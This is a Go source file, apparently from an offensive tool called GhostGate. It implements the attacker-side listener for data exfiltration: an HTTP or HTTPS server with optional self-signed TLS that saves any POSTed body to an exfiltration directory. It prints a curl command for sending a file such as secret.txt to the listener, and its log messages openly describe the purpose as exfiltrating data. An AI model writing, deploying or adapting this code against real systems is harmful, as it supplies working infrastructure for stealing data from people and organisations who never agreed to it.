package essentail

import (
	"GhostGate/internal/networking"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/signal"
	"path/filepath"
	"syscall"
)

// UploadHandler returns an http.HandlerFunc that receives POST requests and writes
// the request body to a file inside exfilDir. The filename is taken from the
// X-File-Name header, or defaults to "exfil_data.bin".
func UploadHandler(exfilDir string) http.HandlerFunc {
	return func(writer http.ResponseWriter, reader *http.Request) {
		// Only accept POST requests
		if reader.Method != http.MethodPost {
			http.Error(writer, "Use POST to exfiltrate data", http.StatusMethodNotAllowed)
			return
		}

		// Ensure the destination directory exists
		if err := os.MkdirAll(exfilDir, 0755); err != nil {
			log.Printf("[-] Failed to create storage directory: %v", err)
			http.Error(writer, "Internal Server Error", http.StatusInternalServerError)
			return
		}

		// Determine the destination filename
		filename := reader.Header.Get("X-File-Name")
		if filename == "" {
			filename = "exfil_data.bin"
		} else {
			filename = filepath.Base(filename)
		}

		dstPath := filepath.Join(exfilDir, filename)

		// Create the destination file
		dst, err := os.OpenFile(dstPath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
		if err != nil {
			log.Printf("[-] Failed to create file %s: %v", dstPath, err)
			http.Error(writer, "Failed to create destination file", http.StatusInternalServerError)
			return
		}
		defer dst.Close()

		// Stream the request body directly to disk
		bytesCopied, err := io.Copy(dst, reader.Body)
		if err != nil {
			log.Printf("[!] Error during data transfer from %s: %v", reader.RemoteAddr, err)
			http.Error(writer, "Error saving file data", http.StatusInternalServerError)
			return
		}

		log.Printf("[+] Data Transfer Successful: %d bytes received from %s saved as %s", bytesCopied, reader.RemoteAddr, filename)
		writer.WriteHeader(http.StatusCreated)
	}
}

// StartUploadServer registers the upload handler and starts the server on the given port.
// When useTLS is true the server is served over HTTPS. If certFile and keyFile are provided
// those are used; otherwise a self-signed in-memory certificate is generated automatically.
func StartUploadServer(port, urlPath, exfilDir string, useTLS bool, certFile, keyFile string) {
	// Set up signal handling so Ctrl+C triggers a clean shutdown
	stop := make(chan os.Signal, 1)
	signal.Notify(stop, os.Interrupt, syscall.SIGTERM)

	mux := http.NewServeMux()
	mux.HandleFunc(urlPath, UploadHandler(exfilDir))

	scheme := "http"
	if useTLS {
		scheme = "https"
	}

	fmt.Printf("[*] GhostGate Data Exfiltration Listener active on port %s\n", port)
	fmt.Printf("[*] Test command: curl -X POST --data-binary @secret.txt -H 'X-File-Name: secret.txt' %s://%s:%s%s\n",
		scheme, networking.GetOutboundIP(), port, urlPath)
	if useTLS && certFile == "" {
		fmt.Println("[!] Using self-signed certificate — pass -k to curl to skip verification")
	}

	// Start the server in a background goroutine
	go func() {
		var err error

		switch {
		case !useTLS:
			// Plain HTTP
			err = http.ListenAndServe(":"+port, mux)

		case certFile != "" && keyFile != "":
			// HTTPS with user-supplied certificate files
			err = http.ListenAndServeTLS(":"+port, certFile, keyFile, mux)

		default:
			// HTTPS with an auto-generated in-memory self-signed certificate
			certPem, keyPem, genErr := networking.GenerateInMemoryCert()
			if genErr != nil {
				log.Printf("[-] Failed to generate TLS certificate: %v", genErr)
				stop <- syscall.SIGTERM
				return
			}
			err = startTLSServer(port, mux, certPem, keyPem)
		}

		if err != nil && err != http.ErrServerClosed {
			log.Printf("[-] Upload server error: %v\n", err)
			stop <- syscall.SIGTERM
		}
	}()

	<-stop
	fmt.Println("[*] Stopping upload server...")
}